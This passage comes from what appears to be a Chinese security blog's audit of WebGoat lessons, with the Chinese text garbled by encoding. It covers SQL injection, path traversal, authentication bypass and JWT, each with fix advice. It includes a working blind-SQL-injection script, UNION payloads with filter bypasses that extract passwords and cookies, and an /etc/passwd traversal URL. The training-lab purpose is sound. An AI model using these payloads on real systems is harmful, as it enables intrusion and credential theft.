åŒå¼•å·ï¼Œæ‰€ä»¥åªèƒ½ç”¨å­—ç¬¦æ‹¼æ¥çš„æ–¹å¼æ‹¼æ¥ sql è¯­å¥ï¼Œå»ºè®®å¯¹åˆ—åè¿›è¡Œç™½åå•è¿‡æ»¤</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> List&lt;Server&gt; <span class=\"title\">sort</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String column)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        List&lt;Server&gt; servers = <span class=\"keyword\">new</span> ArrayList&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> (Connection connection = dataSource.getConnection();</span><br><span class=\"line\">             PreparedStatement preparedStatement = connection.prepareStatement(<span class=\"string\">&quot;select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#x27;out of order&#x27; order by &quot;</span> + column)) &#123;</span><br><span class=\"line\">            ResultSet rs = preparedStatement.executeQuery();</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (rs.next()) &#123;</span><br><span class=\"line\">                Server server = <span class=\"keyword\">new</span> Server(rs.getString(<span class=\"number\">1</span>), rs.getString(<span class=\"number\">2</span>), rs.getString(<span class=\"number\">3</span>), rs.getString(<span class=\"number\">4</span>), rs.getString(<span class=\"number\">5</span>), rs.getString(<span class=\"number\">6</span>));</span><br><span class=\"line\">                servers.add(server);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> servers;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql4.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾:</p>\n<p>sqlmap ä¸å¤ªå¥½ä½¿ï¼Œå¤ªæ…¢äº†ï¼Œç„¶åå°±çœ‹è§å¤§ä½¬å†™çš„è„šæœ¬</p>\n<p>å¸ƒå°”ç›²æ³¨ï¼Œæ ¹æ®è¿”å›æ•°æ®çš„æ’åºæ¥åˆ¤æ–­çœŸå‡ (tql)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> digits</span><br><span class=\"line\">chars = digits+<span class=\"string\">&quot;.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;X-Requested-With&#x27;</span>: <span class=\"string\">&#x27;XMLHttpRequest&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cookies = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;JSESSIONID&#x27;</span>: <span class=\"string\">&#x27;D81iy9aS29fcA8JZUl1QEdeNBahRWoMFk8YyziGj&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class=\"string\">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">proxy=&#123;<span class=\"string\">&quot;http&quot;</span>: <span class=\"string\">&quot;http://127.0.0.1:6666&quot;</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    i += <span class=\"number\">1</span></span><br><span class=\"line\">    temp = result</span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> chars:</span><br><span class=\"line\">        vul_url = <span class=\"string\">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class=\"built_in\">format</span>(i, char)</span><br><span class=\"line\">        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)</span><br><span class=\"line\">        <span class=\"comment\"># print(resp.json())</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;webgoat-acc&#x27;</span> <span class=\"keyword\">in</span> resp.json()[<span class=\"number\">0</span>][<span class=\"string\">&#x27;hostname&#x27;</span>]:</span><br><span class=\"line\">            result += char</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> temp == result:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;select * from table where </span></span><br><span class=\"line\"><span class=\"string\">column = </span></span><br><span class=\"line\"><span class=\"string\">case</span></span><br><span class=\"line\"><span class=\"string\">when (select substr(ip,&#123;0&#125;,1) = &#x27;&#123;1&#125;&#x27; from server where  hostname = &#x27;webgoat-prd&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">then hostname</span></span><br><span class=\"line\"><span class=\"string\">else mac end&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"sql12.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injectionâ€“&gt;SqlOnlyInputValidation</p>\n<p>é™åˆ¶ç”¨æˆ·è¾“å…¥å†…å®¹ä¸èƒ½åŒ…å«ç©ºæ ¼ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è¿‡ /**/ æ³¨é‡Šï¼Œæ‹¬å·ç­‰ç»•è¿‡ï¼Œè¿‡æ»¤ç©ºæ ¼åç›´æ¥è°ƒç”¨ SQLInjectionLesson6a çš„æ³¨å…¥å‡½æ•°ï¼ˆå­—ç¬¦æ‹¼æ¥æ‰§è¡Œå¹¶ç›´æ¥è¾“å‡ºç»“æœï¼‰ï¼Œä¿®å¤å»ºè®®åŒ SQLInjectionLesson6a</p>\n<p><img src=\"sql5.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;/**/union/**/select/**/userid,user_name,password,cookie,&#x27;&#x27;,&#x27;&#x27;,0/**/from/**/user_system_data/**/--/**/</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql10.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injectionâ€“&gt;SqlOnlyInputValidationOnKeywords</p>\n<p>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå…³é”®å­—â€™selectâ€™ 'fromâ€™è¿›è¡Œäº†ä¸€æ¬¡åˆ¤æ–­ç½®ç©ºï¼Œå¹¶é™åˆ¶ç”¨æˆ·è¾“å…¥ä¸èƒ½åŒ…å«ç©ºæ ¼ï¼Œå¯ä»¥é€šè¿‡åŒå†™ + æ³¨é‡Šç»•è¿‡ç»•è¿‡ï¼Œå»ºè®®ä½¿ç”¨é¢„ç¼–è¯‘</p>\n<p><img src=\"sql6.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;/**/union/**/selecselectt/**/userid,user_name,password,cookie,&#x27;&#x27;,&#x27;&#x27;,0/**/frfromom/**/user_system_data/**/--/**/</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql11.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"ä»»æ„æ–‡ä»¶ä¸Šä¼ \"><a class=\"markdownIt-Anchor\" href=\"#ä»»æ„æ–‡ä»¶ä¸Šä¼ \">#</a> ä»»æ„æ–‡ä»¶ä¸Šä¼ </h1>\n<h2 id=\"æ¼æ´æè¿°-2\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-2\">#</a> æ¼æ´æè¿°</h2>\n<p>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å…è®¸ç”¨æˆ·å°†æœ¬åœ°çš„æ–‡ä»¶é€šè¿‡ Web é¡µé¢æäº¤åˆ°ç½‘ç«™æœåŠ¡å™¨ä¸Šï¼Œä½†æ˜¯å¦‚æœä¸å¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆæ³•æ€§éªŒè¯ï¼Œåˆ™æ”»å‡»è€…å¯åˆ©ç”¨ Web åº”ç”¨ç³»ç»Ÿæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼ˆå¦‚æ–‡ä»¶ä¸Šä¼ ã€å›¾åƒä¸Šä¼ ç­‰ï¼‰çš„ä»£ç ç¼ºé™·æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶æˆ–è€… webshellï¼Œå¹¶åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œä»¥è¾¾åˆ°è·å– Web åº”ç”¨ç³»ç»Ÿæ§åˆ¶æƒé™æˆ–å…¶ä»–ç›®çš„ã€‚</p>\n<h2 id=\"æ¼æ´æˆå› -2\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -2\">#</a> æ¼æ´æˆå› </h2>\n<p>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œåˆæ³•æ€§éªŒè¯</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-2\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-2\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<ol>\n<li>\n<p>path-traversalâ€“&gt;ProfileUpload</p>\n<p>è·å–å‰ç«¯ä¸Šä¼ çš„æ–‡ä»¶ä»¥åŠå­—ç¬¦ä¸² â€œfullNameâ€</p>\n</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@PostMapping(value = &quot;/PathTraversal/profile-upload&quot;, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)</span></span><br><span class=\"line\"> <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;uploadedFile&quot;)</span> MultipartFile file, <span class=\"meta\">@RequestParam(value = &quot;fullName&quot;, required = false)</span> String fullName)</span> </span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, fullName);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>è°ƒç”¨çˆ¶ç±» ProfileUploadBaseï¼Œexecute () æ–¹æ³•ï¼Œåˆ¤æ–­æ–‡ä»¶å’Œ &quot;fullName&quot; éç©ºåç›´æ¥ä¸Šä¼ ï¼Œå¹¶ä¸” â€œfullNameâ€ ç”¨ä½œå­è·¯å¾„åå­—ç¬¦ä¸²</p>\n<p><img src=\"sql7.png\" alt=\"\"></p>\n<p>ä¿®å¤å»ºè®®</p>\n<ol>\n<li>å¯¹ fullName è¿›è¡Œåˆ¤æ–­è¿‡æ»¤</li>\n<li>ä½¿ç”¨é€‚å½“çš„æƒé™ä¿æŠ¤æ–‡ä»¶å¤¹</li>\n<li>éšæœºåŒ–é‡å‘½åç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶å</li>\n<li>æ ¹æ®ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹é‡æ„æ–‡ä»¶</li>\n</ol>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"pt01.png\" alt=\"\"><img src=\"pt02.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>path-traversalâ€“&gt;ProfileUploadFix</li>\n</ol>\n<p>å¯¹ â€œfullNameâ€ è¿‡æ»¤äº† â€œâ€¦/â€ï¼Œä½†æ˜¯å› ä¸º replace å¹¶ä¸èƒ½é€’å½’æ£€æµ‹ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡åŒå†™ç»•è¿‡ (â€™â€¦/./â€™)ï¼Œä¿®å¤å»ºè®®åŒä¸Š</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(            <span class=\"meta\">@RequestParam(&quot;uploadedFileFix&quot;)</span> MultipartFile file,            <span class=\"meta\">@RequestParam(value = &quot;fullNameFix&quot;, required = false)</span> String fullName)</span> </span>&#123;        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, fullName != <span class=\"keyword\">null</span> ? fullName.replace(<span class=\"string\">&quot;../&quot;</span>, <span class=\"string\">&quot;&quot;</span>) : <span class=\"string\">&quot;&quot;</span>);    &#125;</span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"pt03.png\" alt=\"\"></p>\n<p><img src=\"pt04.png\" alt=\"\"></p>\n<ol start=\"3\">\n<li>path-traversalâ€“&gt;ProfileUploadRemoveUserInput</li>\n</ol>\n<p>ç›´æ¥ä½¿ç”¨äº†æºæ–‡ä»¶åï¼Œæ‰€ä»¥ç›´æ¥ä¿®æ”¹æ–‡ä»¶åå³å¯ï¼Œå»ºè®®éšæœºé‡å‘½åæ–‡ä»¶å</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;uploadedFileRemoveUserInput&quot;)</span> MultipartFile file)</span> </span>&#123;        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, file.getOriginalFilename());    &#125;</span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"pt05.png\" alt=\"\"></p>\n<p><img src=\"pt06.png\" alt=\"\"></p>\n<h1 id=\"ç›®å½•éå†\"><a class=\"markdownIt-Anchor\" href=\"#ç›®å½•éå†\">#</a> ç›®å½•éå†</h1>\n<h2 id=\"æ¼æ´æè¿°-3\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-3\">#</a> æ¼æ´æè¿°</h2>\n<p>è·¯å¾„éå†ï¼Œå³åˆ©ç”¨è·¯å¾„å›æº¯ç¬¦ â€œâ€¦/â€ è·³å‡ºç¨‹åºæœ¬èº«çš„é™åˆ¶ç›®å½•å®ç°ä¸‹è½½ä»»æ„æ–‡ä»¶ã€‚ä¾‹å¦‚ Web åº”ç”¨æºç ç›®å½•ã€Web åº”ç”¨é…ç½®æ–‡ä»¶ã€æ•æ„Ÿçš„ç³»ç»Ÿæ–‡ä»¶ï¼ˆ/etc/passwdã€/etc/paswdï¼‰ç­‰ã€‚</p>\n<p>ä¸€ä¸ªæ­£å¸¸çš„ Web åŠŸèƒ½è¯·æ±‚ï¼š</p>\n<p><a href=\"http://www.test.com/get-files.jsp?file=report.pdf\">http://www.test.com/get-files.jsp?file=report.pdf</a></p>\n<p>å¦‚æœ Web åº”ç”¨å­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥æ„é€ ä»¥ä¸‹è¯·æ±‚æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶ï¼š</p>\n<p><a href=\"http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd\">http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd</a></p>\n<h2 id=\"æ¼æ´æˆå› -3\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -3\">#</a> æ¼æ´æˆå› </h2>\n<p>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œåˆæ³•æ€§éªŒè¯</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-3\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-3\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<p>path-traversalâ€“&gt;ProfileUploadRetrieval</p>\n<p>æºç è¿‡æ»¤äº†â€™â€¦â€˜å’Œâ€™/â€™ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ url ç¼–ç è¿›è¡Œç»•è¿‡</p>\n<p>æ ¹æ®å‚æ•° id è¿›è¡Œåˆ¤æ–­</p>\n<p><img src=\"pt08.png\" alt=\"\"></p>\n<p>å¦‚æœç”¨æˆ·è¾“å…¥çš„ id.jpg å­˜åœ¨ï¼Œé‚£ä¹ˆè¿”å›åŒ…ä¸­è¿”å›è¯¥å›¾ç‰‡çš„ base64 ç¼–ç </p>\n<p>å¦‚æœä¸å­˜åœ¨ï¼Œå°±è¿”å› catPicturesDirectory çš„çˆ¶ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œç”¨é€—å·åˆ†å‰²</p>\n<p><img src=\"pt09.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"pt07.png\" alt=\"\"></p>\n<p>ä¿®å¤å»ºè®®ï¼š</p>\n<pre><code>1. ä½¿ç”¨é€‚å½“çš„æƒé™ä¿æŠ¤æ–‡ä»¶å¤¹2. ç¦æ­¢è¿”å›ç›®å½•ä¿¡æ¯3. å¯¹urlç¼–ç åçš„å‚æ•°ä¹Ÿè¦è¿›è¡Œè§£ç è¿‡æ»¤4. ç»Ÿä¸€404ç•Œé¢\n</code></pre>\n<h1 id=\"èº«ä»½è®¤è¯ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#èº«ä»½è®¤è¯ç»•è¿‡\">#</a> èº«ä»½è®¤è¯ç»•è¿‡</h1>\n<h2 id=\"æ¼æ´æè¿°-4\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-4\">#</a> æ¼æ´æè¿°</h2>\n<p>ä¸šåŠ¡æµç¨‹ç”±å‰ç«¯è¿›è¡Œæ§åˆ¶ï¼ŒæœåŠ¡å™¨ç«¯å¯¹åº”çš„å„åŠŸèƒ½åˆ†ç¦»ï¼Œå¯¼è‡´ä¸šåŠ¡æµç¨‹å¯è¢«æ”»å‡»è€…è¿›è¡Œæ§åˆ¶ï¼Œä»è€Œç»•è¿‡æµç¨‹ä¸­çš„å„é¡¹æ ¡éªŒåŠŸèƒ½ï¼Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</p>\n<h2 id=\"æ¼æ´æˆå› -4\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -4\">#</a> æ¼æ´æˆå› </h2>\n<p>æœªå¯¹ç”¨æˆ·å¯æ§çš„å‚æ•°è¿›è¡Œåˆæ³•æ€§éªŒè¯</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-4\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-4\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<ol>\n<li>\n<p>auth-bypassâ€“&gt;VerifyAccount.completed()</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>)                    .feedback(<span class=\"string\">&quot;verify-account.cheated&quot;</span>)                    .output(<span class=\"string\">&quot;Yes, you guessed correctly, but see the feedback message&quot;</span>)                    .build();        &#125;</span><br></pre></td></tr></table></figure>\n<p>è°ƒç”¨ verificationHelper.didUserLikelylCheat ()</p>\n<p>å°†ç”¨æˆ·è¾“å…¥çš„é—®é¢˜ç”¨é”®å€¼å¯¹çš„æ–¹å¼ä¿å­˜ï¼Œå¹¶å’Œåç«¯ä»£ç å­˜å‚¨çš„ç­”æ¡ˆè¿›è¡Œæ¯”è¾ƒã€‚</p>\n<p>ä½†æ˜¯ Mapper åœ¨ get ä¸€ä¸ªä¸å­˜åœ¨çš„é”®æ—¶ï¼Œå¹¶ä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯è¿”å› nullã€‚æ‰€ä»¥ç”¨æˆ·å¯ä»¥é€šè¿‡æ§åˆ¶ key çš„å€¼ç»•è¿‡ã€‚</p>\n<p>å»ºè®®</p>\n<ol>\n<li>è‹¥ç”¨æˆ·å¯æ§ keyï¼Œé‚£ä¹ˆåº”è¯¥å…ˆåˆ¤æ–­è¿™ä¸ª key æ˜¯å¦åˆæ³•</li>\n<li>è®¾ç½®ä¸å¯æ§ keyï¼Œç›´æ¥å°†ç”¨æˆ·çš„è¾“å…¥ä½œä¸º value è¿›è¡Œåˆ¤æ–­</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> &#123;        userSecQuestions.put(<span class=\"string\">&quot;secQuestion0&quot;</span>, <span class=\"string\">&quot;Dr. Watson&quot;</span>);        userSecQuestions.put(<span class=\"string\">&quot;secQuestion1&quot;</span>, <span class=\"string\">&quot;Baker Street&quot;</span>);    &#125;    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Map&lt;Integer, Map&gt; secQuestionStore = <span class=\"keyword\">new</span> HashMap&lt;&gt;();    <span class=\"keyword\">static</span> &#123;        secQuestionStore.put(verifyUserId, userSecQuestions);    &#125;    <span class=\"comment\">// end &#x27;data store set up&#x27;    // this is to aid feedback in the attack process and is not intended to be part of the &#x27;vulnerable&#x27; code    public boolean didUserLikelylCheat(HashMap&lt;String, String&gt; submittedAnswers) &#123;        boolean likely = false;        if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &#123;            likely = true;        &#125;        if ((submittedAnswers.containsKey(&quot;secQuestion0&quot;) &amp;&amp; submittedAnswers.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)))                &amp;&amp; (submittedAnswers.containsKey(&quot;secQuestion1&quot;) &amp;&amp; submittedAnswers.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;)))) &#123;            likely = true;        &#125; else &#123;            likely = false;        &#125;        return likely;</span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"ap01.png\" alt=\"\"></p>\n</li>\n<li>\n<p>auth-bypassâ€“&gt;AccountVerificationHelper.verifyAccount()</p>\n<p>åˆ¤æ–­äº† key æ˜¯å¦å­˜åœ¨ï¼Œä½†æ˜¯ä¸åŒ…å«è¯¥ key ä»ç„¶å¯ä»¥ç»•è¿‡</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//end of cheating check ... the method below is the one of real interest. Can you find the flaw?    public boolean verifyAccount(Integer userId, HashMap&lt;String, String&gt; submittedQuestions) &#123;        //short circuit if no questions are submitted        if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;            return false;        &#125;        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;))) &#123;            return false;        &#125;        if (submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) &#123;            return false;        &#125;        // else        return true;    &#125;</span></span><br></pre></td></tr></table></figure>\n<p>å»ºè®®ä¿®æ”¹ä¸º</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;        &#125;<span class=\"comment\">// åŒæ—¶åˆ¤æ–­keyå’Œå¯¹åº”çš„value        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)) &amp;&amp; submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) &#123;            return true;        &#125;        // else        return false;</span></span><br></pre></td></tr></table></figure>\n<p>ä½œè€…æ²¡å†™è¿™ä¸ªåŠŸèƒ½ç‚¹ï¼Œå°±æ˜¯åœ¨æºç é‡Œé¢é—®äº†ä¸€ä¸‹</p>\n</li>\n<li>\n<p>JWT</p>\n<p>jwtâ€“&gt;JWTVotesEndpoint.vote()</p>\n<p>æ²¡æœ‰éªŒè¯ç­¾åï¼Œç›´æ¥åˆ¤æ–­ token ä¸­çš„ admin å¯¹åº”å€¼æ˜¯å¦ä¸º trueï¼Œæ‰€ä»¥æŠŠ token ä¸­çš„ alg è®¾ç½®ä¸º noneï¼Œadmin è®¾ç½®ä¸º true å³å¯ï¼ˆäº²æµ‹ bp è½¬æ¢çš„ä¸è¡Œï¼‰</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (StringUtils.isEmpty(accessToken)) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-invalid-token&quot;</span>).build();        &#125; <span class=\"keyword\">else</span> &#123;            <span class=\"keyword\">try</span> &#123;                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);                Claims claims = (Claims) jwt.getBody();                <span class=\"keyword\">boolean</span> isAdmin = Boolean.valueOf((String) claims.get(<span class=\"string\">&quot;admin&quot;</span>));                <span class=\"keyword\">if</span> (!isAdmin) &#123;                    <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-only-admin&quot;</span>).build();                &#125; <span class=\"keyword\">else</span> &#123;                    votes.values().forEach(vote -&gt; vote.reset());                    <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).build();                &#125;            &#125; <span class=\"keyword\">catch</span> (JwtException e) &#123;                <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();            &#125;        &#125;</span><br></pre></td></tr></table></figure>\n<p>è½¬æ¢è„šæœ¬ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-import jwtimport base64# header# 